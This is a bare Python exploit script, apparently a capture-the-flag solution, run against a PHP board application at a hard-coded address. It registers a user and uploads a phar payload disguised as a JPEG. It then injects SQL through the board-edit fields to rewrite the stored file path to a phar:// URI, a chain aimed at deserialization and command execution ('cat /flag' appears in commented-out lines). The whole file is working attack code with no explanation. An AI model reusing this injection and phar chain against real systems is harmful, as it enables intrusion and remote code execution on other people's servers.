import requests

URL = 'http://52.79.217.37:10001'
# URL = 'http://localhost:10001'

# cmd = 'cat /flag'

# with open('./create_phar_template.php', 'r') as f:
#     with open('./create_phar.php', 'w') as wf:
#         wf.write(f.read().replace('$REPLACE_THIS', cmd))

# import os
# os.system('php --define phar.readonly=0 create_phar.php')

with requests.Session() as s:
    r = s.post(URL + '/users/registerapi.php', data={
        'user': 'ohk990102',
        'pass': 'testtest'
    })

    r = s.post(URL + '/users/loginapi.php', data={
        'user': 'ohk990102',
        'pass': 'testtest'
    })

    r = s.post(URL + '/users/editapi.php', data={
        'user': 'ohk990102',
        'pass': 'testtest'
    }, files={
        'file': ('file.jpg', open('payload.jpg', 'rb'), 'image/jpg')
    })

    r = s.post(URL + '/users/loginapi.php', data={
        'user': 'ohk990102',
        'pass': 'testtest'
    })

    r = s.post(URL + '/users/profileapi.php')
    upload_path = '/var/www/html' + r.json()['filepath']

    r = s.post(URL + '/board/createapi.php', data={
        'title': 'a',
        'content': 'b',
        'bname': 'main'
    })

    index = r.json()['idx']
    index = r.text.split('"idx":')[1].rstrip("}")

    filepath_to_inject = f'phar://{upload_path}'
    filepath_to_inject = '0x' + filepath_to_inject.encode().hex()

    r = s.post(URL + '/board/editapi.php', data={
        'idx': index,
        'bname': 'test&#092;\' UNION SELECT &quot;&quot;,&quot;main,users#&quot;,&quot;&quot;,&quot;&quot;;#',
        'toname': 'main,users#',
        'title': f'\n SET users.filepath={filepath_to_inject} WHERE users.user=0x6f686b393930313032#',
    })


    print(r.text)

    r = s.post(URL + '/users/profileapi.php')
    print(r.text)